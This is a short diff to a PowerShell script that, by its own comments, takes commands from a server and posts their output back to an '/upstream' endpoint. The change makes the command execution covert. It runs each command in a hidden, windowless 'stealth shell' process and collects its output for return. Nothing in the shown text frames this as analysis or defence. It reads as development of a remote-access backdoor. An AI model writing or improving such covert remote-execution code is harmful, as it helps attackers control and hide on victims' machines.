@@ -33,8 +33,28 @@ try {
                     # output should be send back to server as a text msg to POST /upstream
                     try {
                         if ($cmd.Trim() -ne "") {
-                            # Execute command and capture output
-                            $output = Invoke-Expression $cmd 2>&1 | Out-String
+                            # Execute command sequence in a temporary stealth shell
+                            $psi = New-Object System.Diagnostics.ProcessStartInfo
+                            $psi.FileName = "powershell.exe"
+                            $psi.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"$cmd`""
+                            $psi.RedirectStandardOutput = $true
+                            $psi.RedirectStandardError = $true
+                            $psi.UseShellExecute = $false
+                            $psi.CreateNoWindow = $true
+                            
+                            $process = New-Object System.Diagnostics.Process
+                            $process.StartInfo = $psi
+                            $process.Start() | Out-Null
+                            
+                            $output = $process.StandardOutput.ReadToEnd()
+                            $errorOutput = $process.StandardError.ReadToEnd()
+                            $process.WaitForExit()
+                            
+                            # Combine stdout and stderr
+                            if ($errorOutput) {
+                                $output += "`n" + $errorOutput
+                            }
+                            
                             Write-Host "Command executed successfully" -ForegroundColor Green
                             Write-Host "Output: $output" -ForegroundColor Gray
                             
